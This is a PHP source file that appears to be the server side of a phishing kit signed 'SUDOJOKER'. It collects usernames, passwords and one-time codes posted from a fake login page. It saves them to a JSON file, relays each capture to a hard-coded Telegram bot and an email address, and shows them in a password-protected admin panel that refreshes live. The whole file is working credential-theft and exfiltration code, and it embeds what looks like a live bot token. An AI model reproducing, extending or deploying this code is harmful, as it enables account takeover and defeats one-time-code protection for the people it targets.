<?php
// Enable error reporting for debugging (remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set headers to accept cross-origin requests
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// Configuration - REPLACE WITH YOUR ACTUAL VALUES
$config = [
    'telegram_bot_token' => '7539619453:AAFf8Tq6Sugdv1Tq0Azp3O7CT5izGN6twss',
    'telegram_chat_id' => '7094100316',
    'admin_username' => 'admin',  // Username for the admin panel
    'admin_password' => 'secure_password',  // Password for the admin panel
    'email_to' => 'Jokersudo@yandex.com',
    'database_file' => 'reports.json',  // File to store reports
    'max_reports' => 100  // Maximum number of reports to keep
];

// Create database file if it doesn't exist
if (!file_exists($config['database_file'])) {
    file_put_contents($config['database_file'], json_encode([]));
    chmod($config['database_file'], 0666); // Make writable
}

// Handle different request types
$request_method = $_SERVER['REQUEST_METHOD'];

if ($request_method === 'OPTIONS') {
    // Handle preflight request
    header("HTTP/1.1 200 OK");
    exit();
} elseif ($request_method === 'POST') {
    // Handle incoming report data
    processReport();
} elseif ($request_method === 'GET') {
    // Check if this is an admin panel request
    if (isset($_GET['view']) && $_GET['view'] === 'admin') {
        // Show admin login or panel
        showAdminPanel();
    } else {
        // Not a valid request
        header("HTTP/1.1 404 Not Found");
        echo "Not found";
    }
} else {
    // Method not allowed
    header("HTTP/1.1 405 Method Not Allowed");
    echo "Method not allowed";
}

/**
 * Process incoming report data
 */
function processReport() {
    global $config;
    
    // Get the raw POST data
    $jsonData = file_get_contents('php://input');
    $data = json_decode($jsonData, true);
    
    // Verify that we have data
    if ($data) {
        // Add timestamp
        $data['timestamp'] = time();
        
        // Store the report
        storeReport($data);
        
        // Format message based on the action type
        switch ($data['action']) {
            case 'LOGIN_ATTEMPT':
                $message = "🔐 LOGIN CREDENTIALS CAPTURED BY SUDOJOKER 🔐\n\n";
                $message .= "Source: " . htmlspecialchars($data['source']) . "\n";
                $message .= "Username: " . htmlspecialchars($data['username']) . "\n";
                $message .= "Password: " . htmlspecialchars($data['password']) . "\n";
                $message .= "Remember Me: " . ($data['remember'] ? 'Yes' : 'No') . "\n\n";
                break;
                
            case 'OTP_ATTEMPT':
                $message = "🔑 OTP VERIFICATION ATTEMPT BY SUDOJKER 🔑\n\n";
                $message .= "Source: " . htmlspecialchars($data['source']) . "\n";
                $message .= "Username: " . htmlspecialchars($data['username']) . "\n";
                $message .= "OTP Code: " . htmlspecialchars($data['otp']) . "\n";
                $message .= "Attempt #: " . htmlspecialchars($data['attempt']) . "\n\n";
                break;
                
            case 'OTP_RESEND':
                $message = "🔄 OTP RESEND REQUESTED SUDOJOKER 🔄\n\n";
                $message .= "Source: " . htmlspecialchars($data['source']) . "\n";
                $message .= "Username: " . htmlspecialchars($data['username']) . "\n\n";
                break;
                
            case 'COMPLETE':
                $message = "✅ VERIFICATION COMPLETE SUDOJOKER ✅\n\n";
                $message .= "Source: " . htmlspecialchars($data['source']) . "\n";
                $message .= "Username: " . htmlspecialchars($data['username']) . "\n";
                $message .= "Password: " . htmlspecialchars($data['password']) . "\n";
                $message .= "Final OTP: " . htmlspecialchars($data['otp']) . "\n\n";
                break;
                
            default:
                $message = "📊 NEW DATA SUBMISSION SUDOJOKER 📊\n\n";
                break;
        }
        
        // Add common details
        if (isset($data['ip'])) {
            $message .= "IP Address: " . htmlspecialchars($data['ip']) . "\n";
        }
        
        if (isset($data['userAgent'])) {
            $message .= "User Agent: " . htmlspecialchars($data['userAgent']) . "\n";
        }
        
        $message .= "Date/Time: " . htmlspecialchars($data['dateTime']) . "\n";
        
        // Send to Telegram
        sendToTelegram($message);
        
        // Send via email
        sendEmail($message, "New " . $data['action'] . " Report");
        
        // Return success response
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'message' => 'Data received']);
    } else {
        // Invalid data
        header("HTTP/1.1 400 Bad Request");
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Invalid data received']);
    }
}

/**
 * Store report in database file
 */
function storeReport($data) {
    global $config;
    
    // Read existing reports
    $reports = json_decode(file_get_contents($config['database_file']), true);
    
    // Add new report at the beginning
    array_unshift($reports, $data);
    
    // Limit the number of reports
    if (count($reports) > $config['max_reports']) {
        $reports = array_slice($reports, 0, $config['max_reports']);
    }
    
    // Save back to file
    file_put_contents($config['database_file'], json_encode($reports));
}

/**
 * Send message to Telegram
 */
function sendToTelegram($message) {
    global $config;
    
    // Telegram API URL
    $telegramApiUrl = "https://api.telegram.org/bot{$config['telegram_bot_token']}/sendMessage";
    
    // Prepare data for Telegram
    $telegramData = [
        'chat_id' => $config['telegram_chat_id'],
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    // Use cURL to send the message
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

/**
 * Send message via email
 */
function sendEmail($message, $subject) {
    global $config;
    
    // Headers
    $headers = 'From: reporter@' . $_SERVER['HTTP_HOST'] . "\r\n";
    $headers .= 'Reply-To: noreply@' . $_SERVER['HTTP_HOST'] . "\r\n";
    $headers .= 'X-Mailer: PHP/' . phpversion() . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    // Send email
    return mail($config['email_to'], $subject, $message, $headers);
}

/**
 * Show admin panel or login
 */
function showAdminPanel() {
    global $config;
    
    // Check if user is logged in or attempting to log in
    $isLoggedIn = false;
    
    if (isset($_COOKIE['admin_auth']) && $_COOKIE['admin_auth'] === md5($config['admin_username'] . $config['admin_password'])) {
        $isLoggedIn = true;
    } elseif (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $config['admin_username'] && $_POST['password'] === $config['admin_password']) {
            // Set cookie for 1 hour
            setcookie('admin_auth', md5($config['admin_username'] . $config['admin_password']), time() + 3600, '/');
            $isLoggedIn = true;
        }
    }
    
    if ($isLoggedIn) {
        // Show admin panel
        displayAdminPanel();
    } else {
        // Show login form
        displayLoginForm();
    }
}

/**
 * Display admin login form
 */
function displayLoginForm() {
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        h1 {
            text-align: center;
            color: #333;
            margin-top: 0;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 3px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #3367d6;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Admin Login</h1>
        <form method="post">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required>
            
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
HTML;
}

/**
 * Display admin panel with reports
 */
function displayAdminPanel() {
    global $config;
    
    // Read reports
    $reports = json_decode(file_get_contents($config['database_file']), true);
    
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reports Admin Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            margin: 0;
        }
        .controls {
            display: flex;
            gap: 10px;
        }
        .btn {
            padding: 8px 12px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        .btn-logout {
            background-color: #f44336;
        }
        .btn-refresh {
            background-color: #4caf50;
        }
        .reports-container {
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        .report {
            padding: 15px;
            border-bottom: 1px solid #eee;
        }
        .report:last-child {
            border-bottom: none;
        }
        .report-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .report-type {
            font-weight: bold;
            background-color: #e0e0e0;
            padding: 3px 8px;
            border-radius: 3px;
        }
        .report-type.login {
            background-color: #bbdefb;
            color: #0d47a1;
        }
        .report-type.otp {
            background-color: #c8e6c9;
            color: #1b5e20;
        }
        .report-type.complete {
            background-color: #f9a825;
            color: #fff;
        }
        .report-date {
            color: #666;
            font-size: 14px;
        }
        .report-content {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 10px;
        }
        .report-field {
            display: flex;
            margin-bottom: 5px;
        }
        .field-name {
            font-weight: bold;
            width: 100px;
            flex-shrink: 0;
        }
        .field-value {
            word-break: break-all;
        }
        .empty-message {
            padding: 30px;
            text-align: center;
            color: #666;
        }
        .live-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            background-color: #4caf50;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .status-bar {
            padding: 10px;
            background-color: #333;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        #auto-refresh {
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Reports Admin Panel</h1>
        <div class="controls">
            <button class="btn btn-refresh" id="refresh-btn">Refresh</button>
            <button class="btn btn-logout" id="logout-btn">Logout</button>
        </div>
    </div>
    
    <div class="status-bar">
        <div>
            <span class="live-indicator"></span>
            <span>Live Reports</span>
        </div>
        <div>
            <input type="checkbox" id="auto-refresh" checked>
            <label for="auto-refresh">Auto refresh (10s)</label>
        </div>
    </div>
    
    <div class="reports-container" id="reports-container">
HTML;

    if (empty($reports)) {
        echo '<div class="empty-message">No reports yet. Waiting for data...</div>';
    } else {
        foreach ($reports as $report) {
            $date = date('M d, Y H:i:s', $report['timestamp']);
            $actionClass = '';
            $actionDisplay = '';
            
            switch ($report['action'] ?? '') {
                case 'LOGIN_ATTEMPT':
                    $actionClass = 'login';
                    $actionDisplay = 'Login Credentials';
                    break;
                case 'OTP_ATTEMPT':
                    $actionClass = 'otp';
                    $actionDisplay = 'OTP Attempt #' . ($report['attempt'] ?? '?');
                    break;
                case 'OTP_RESEND':
                    $actionClass = 'otp';
                    $actionDisplay = 'OTP Resend';
                    break;
                case 'COMPLETE':
                    $actionClass = 'complete';
                    $actionDisplay = 'Complete Verification';
                    break;
                default:
                    $actionDisplay = 'Unknown';
                    break;
            }
            
            echo <<<HTML
        <div class="report">
            <div class="report-header">
                <span class="report-type {$actionClass}">{$actionDisplay}</span>
                <span class="report-date">{$date}</span>
            </div>
            <div class="report-content">
HTML;

            // Display report fields
            $skipFields = ['action', 'timestamp', 'stage', 'attempt'];
            foreach ($report as $field => $value) {
                if (in_array($field, $skipFields)) continue;
                
                if (is_bool($value)) {
                    $value = $value ? 'Yes' : 'No';
                }
                
                echo <<<HTML
                <div class="report-field">
                    <span class="field-name">{$field}</span>
                    <span class="field-value">{$value}</span>
                </div>
HTML;
            }

            echo <<<HTML
            </div>
        </div>
HTML;
        }
    }

    echo <<<HTML
    </div>

    <script>
        // Auto refresh functionality
        let refreshInterval;
        const autoRefreshCheckbox = document.getElementById('auto-refresh');
        const refreshBtn = document.getElementById('refresh-btn');
        const logoutBtn = document.getElementById('logout-btn');
        
        // Set up auto refresh
        function setupAutoRefresh() {
            if (autoRefreshCheckbox.checked) {
                refreshInterval = setInterval(() => {
                    window.location.reload();
                }, 10000); // 10 seconds
            } else {
                clearInterval(refreshInterval);
            }
        }
        
        // Initialize auto refresh
        setupAutoRefresh();
        
        // Toggle auto refresh
        autoRefreshCheckbox.addEventListener('change', () => {
            setupAutoRefresh();
        });
        
        // Manual refresh
        refreshBtn.addEventListener('click', () => {
            window.location.reload();
        });
        
        // Logout functionality
        logoutBtn.addEventListener('click', () => {
            document.cookie = 'admin_auth=; Max-Age=-99999999;';
            window.location.reload();
        });
    </script>
</body>
</html>
HTML;
}
?>
